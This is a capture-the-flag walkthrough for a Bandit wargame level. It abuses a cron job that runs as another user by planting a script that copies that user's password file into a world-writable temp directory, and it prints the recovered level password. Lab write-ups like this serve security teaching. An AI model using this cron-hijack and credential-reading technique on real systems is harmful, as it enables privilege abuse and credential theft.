
# Bandit Level 23 → Level 24
## Level Goal

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

*NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
Commands you may need to solve this level*

> chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)


### Solution

```
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

```
bandit23@bandit:/tmp$ mktemp -d
/tmp/tmp.hoO6EAUmRA
bandit23@bandit:/tmp$ cd /tmp/tmp.hoO6EAUmRA
bandit23@bandit:/tmp/tmp.hoO6EAUmRA$ echo "cat /etc/bandit_pass/bandit24 > /tmp/tmp.hoO6EAUmRA/pswd.txt" > getpswd.sh
bandit23@bandit:/tmp/tmp.hoO6EAUmRA$ cat getpswd.sh 
cat /etc/bandit_pass/bandit24 > /tmp/tmp.hoO6EAUmRA/pswd.txt
bandit23@bandit:/tmp/tmp.hoO6EAUmRA$ chmod 777 /tmp/tmp.hoO6EAUmRA
bandit23@bandit:/tmp/tmp.hoO6EAUmRA$ chmod 777 /tmp/tmp.hoO6EAUmRA/getpswd.sh 
bandit23@bandit:/tmp/tmp.hoO6EAUmRA$ cp getpswd.sh /var/spool/bandit24/foo/
bandit23@bandit:/tmp/tmp.hoO6EAUmRA$ ls
getpswd.sh  pswd.txt
bandit23@bandit:/tmp/tmp.hoO6EAUmRA$ cat pswd.txt 
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

```